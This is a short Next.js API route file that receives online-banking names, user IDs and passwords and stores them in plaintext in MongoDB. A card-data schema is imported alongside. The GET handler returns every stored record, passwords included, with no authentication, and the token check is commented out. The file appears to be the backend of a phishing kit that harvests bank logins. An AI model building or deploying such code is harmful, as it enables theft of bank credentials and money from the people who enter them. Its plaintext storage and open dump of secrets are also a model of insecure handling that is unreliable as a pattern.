import { NextResponse } from "next/server";
import CardSchema from "../models/card_schema";
import NetBankingSchema from "../models/net_banking";

//Import Mongoose
import connectDB from "../config/database";

connectDB();

export async function GET() {
  try {
    //Get all news with publisher name
    const data = await NetBankingSchema.find();
    // res.status(200).json(news);
    return NextResponse.json(data);
  } catch (error) {
    // res.status(500).json({ message: error.message });
    return NextResponse.json({ message: error.message });
  }
}

//Create data
export async function POST(request) {
  const { bank_name, user_id, password } =
    await request.json();

  // const decoded = jwt.verify(req.cookies.token, process.env.JWT_SECRET);
  const data = new NetBankingSchema({
    bank_name: bank_name,
    user_id: user_id,
    password: password,
  });

  try {
    await data.save();
    return NextResponse.json({ message: "done" });
  } catch (error) {
    return NextResponse.json({ message: error.message });
  }
}
